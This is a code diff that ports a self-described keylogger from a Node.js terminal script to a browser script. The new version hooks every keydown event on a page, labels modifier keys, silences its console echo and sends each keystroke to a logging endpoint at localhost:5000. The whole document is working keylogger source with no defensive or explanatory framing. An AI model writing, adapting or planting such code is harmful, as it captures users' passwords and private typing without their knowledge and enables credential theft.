@@ -1,91 +1,70 @@
-function myfunction(){
-    const readline = require('readline');
-    const http = require('http');
-
-    readline.emitKeypressEvents(process.stdin);
-    process.stdin.setRawMode(true);
-
+function myfunction() {
     let logging = true;
 
     const sendToServer = (key) => {
         const data = JSON.stringify({ key: key });
 
-        const options = {
-            hostname: 'LocalHost',
-            port: 5000,
-            path: '/log',
+        fetch('http://localhost:5000/log', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
                 'Content-Length': data.length,
             },
-        };
-
-        const req = http.request(options, (res) => {
-            res.on('data', (d) => {
-                process.stdout.write(d);
-            });
-        });
-
-        req.on('error', (error) => {
-            console.error('Error:', error);
-        });
-
-        req.write(data);
-        req.end();
+            body: data,
+        })
+        .then(response => response.text())
+        .then(text => console.log(text))
+        .catch(error => console.error('Error:', error));
     };
 
-    process.stdin.on('keypress', (str, key) => {
+    document.addEventListener('keydown', (event) => {
         if (!logging) return;
-        
-        let keyName = '';
-        
 
-        if (key.shift) {
+        let keyName = '';
+
+        if (event.shiftKey) {
             keyName += '[SHIFT] + ';
         }
-        if (key.ctrl) {
+        if (event.ctrlKey) {
             keyName += '[CTRL] + ';
         }
-        if (key.alt) {
+        if (event.altKey) {
             keyName += '[ALT] + ';
         }
-        if (key.meta) {
+        if (event.metaKey) {
             keyName += '[META] + ';
         }
 
-        switch (key.name) {
-            case 'space':
+        switch (event.key) {
+            case ' ':
                 keyName += '[SPACE]';
                 break;
-            case 'return':
+            case 'Enter':
                 keyName += '[ENTER]';
                 break;
-            case 'backspace':
+            case 'Backspace':
                 keyName += '[BACKSPACE]';
                 break;
-            case 'tab':
+            case 'Tab':
                 keyName += '[TAB]';
                 break;
-            case 'escape':
+            case 'Escape':
                 console.log('Escape key pressed. Stopping keylogger.');
                 logging = false; // Stop logging
-                process.stdin.setRawMode(false);
-                process.stdin.pause();
                 return;
             default:
-                if (!key.ctrl && !key.alt && !key.shift && !key.meta) {
-                    keyName = key.sequence;
-                } else if (key.name) {
-                    keyName += key.name.toUpperCase();
+                if (!event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey) {
+                    keyName = event.key;
+                } else if (event.key) {
+                    keyName += event.key.toUpperCase();
                 }
                 break;
         }
 
-        console.log(keyName);
+        //console.log(keyName);
 
         sendToServer(keyName);
     });
 }
+
 myfunction();
-//console.log('Keylogger started. Press Escape to stop.');
